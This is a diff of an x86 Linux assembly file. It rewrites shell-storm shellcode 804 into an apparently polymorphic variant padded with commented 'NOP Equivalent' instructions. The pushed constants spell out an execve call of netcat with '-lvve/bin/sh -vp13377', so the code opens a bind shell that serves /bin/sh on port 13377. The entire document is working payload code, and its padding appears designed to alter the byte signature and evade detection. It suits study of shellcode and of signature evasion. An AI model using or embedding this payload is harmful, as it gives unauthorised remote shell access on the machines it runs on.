@@ -1,53 +1,53 @@
 ; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-804.php
 
-section .text
-    global _start
+global _start
+
 _start:
 
-sahf
-nop
-cmc
+       sahf                    ; NOP Equivalent.
+       nop                     ; NOP Equivalent.
+       cmc                     ; NOP Equivalent.
 
-xor eax,eax
-xor edx,edx
-push eax
-pop edx
-push edx
-pop eax
+       xor eax,eax             ; Zeroes out EAX.
+       mul edx                 ; Zeroes out EDX through mul. NOP Equivalent.
+       push eax                ; NOP Equivalent.
+       pop edx                 ; NOP Equivalent.
+       push edx                ; NOP Equivalent.
+       pop eax                 ; NOP Equivalent.
 
-push 0x37373333
-std
-push 0x3170762d
-mov edx, esp
-push eax
-push 0x68732f6e
-std
-push 0x69622f65
-pushad
-push 0x76766c2d
-mov ecx,esp
+       push 0x37373333         ; 7733
+       std                     ; NOP Equivalent.
+       push 0x3170762d         ; 1pv-
+       mov edx, esp            ; Copies the value of ESP into EDX.
+       push eax                ; Pushes EAX null dword (0x00000000)
+       push 0x68732f6e         ; hs/n
+       std                     ; NOP Equivalent.
+       push 0x69622f65         ; ib/e
+       sahf                    ; NOP Equivalent.
+       push 0x76766c2d         ; vvl-
+       mov ecx,esp             ; Copies the value of ESP into ECX
 
-push eax
-push 0x636e2f2f
-cmc
-push 0x2f2f2f2f
-inc edi
-inc esi
+       push eax                ; NOP Equivalent.
+       push 0x636e2f2f         ; cn//
+       cmc                     ; NOP Equivalent.
+       push 0x2f2f2f2f         ; ////
+       inc edi                 ; NOP Equivalent.
+       inc esi                 ; NOP Equivalent.
 
-push 0x6e69622f
-mov ebx, esp
-push eax
-cld
-push edx
-push ecx
-nop
-push ebx
-xor edx,edx
-mov  ecx,esp
-push esi
-pop edi
-push edi
-pop esi
-pop ebp
-mov al,11
-int 0x80
+       push 0x6e69622f         ; nib/
+       mov ebx, esp            ; Copies the value of ESP into EBX.
+       push eax                ; Pushes EAX null dword (0x00000000)
+       cld                     ; NOP Equivalent.
+       push edx                ; Pushes value of EDX
+       push ecx                ; Pushes value of ECX
+       nop                     ; NOP Equivalent.
+       push ebx                ; Pushes value of EBX
+       cdq                     ; NOP Equivalent.
+       mov  ecx,esp            ; Copies value from ESP to ECX
+       push esi                ; NOP Equivalent.
+       pop edi                 ; NOP Equivalent.
+       push edi                ; NOP Equivalent.
+       pop esi                 ; NOP Equivalent.
+       pop ebp                 ; NOP Equivalent.
+       mov al,11               ; Call to execve().
+       int 0x80                ; Call to kernel.
